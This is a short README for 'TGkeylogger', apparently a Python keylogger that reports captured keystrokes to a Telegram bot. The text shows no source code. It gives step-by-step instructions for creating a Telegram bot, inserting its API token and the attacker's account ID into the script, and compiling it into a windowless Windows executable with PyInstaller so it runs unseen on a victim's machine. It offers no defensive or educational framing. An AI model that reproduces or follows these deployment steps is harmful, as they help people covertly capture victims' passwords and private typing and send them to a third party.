# TGkeylogger

Instructions:

First create your bot via the official BotFather Telegram: https://t.me/BotFather

Click: /newbot.

Choose a bot name, then a username (e.g. mytest_bot).

Once created, copy your API token (to paste it into the code later).

Then visit the official bot https://t.me/getmyid_bot to find your account ID, which you also need to add to the code.

After editing the file with your data, convert the .py file to .exe by running this command in CMD: pyinstaller --onefile --noconsole TGkeylogger.py (use Windows).

Wait for the conversion process from the .py format to the executable .exe file to complete.
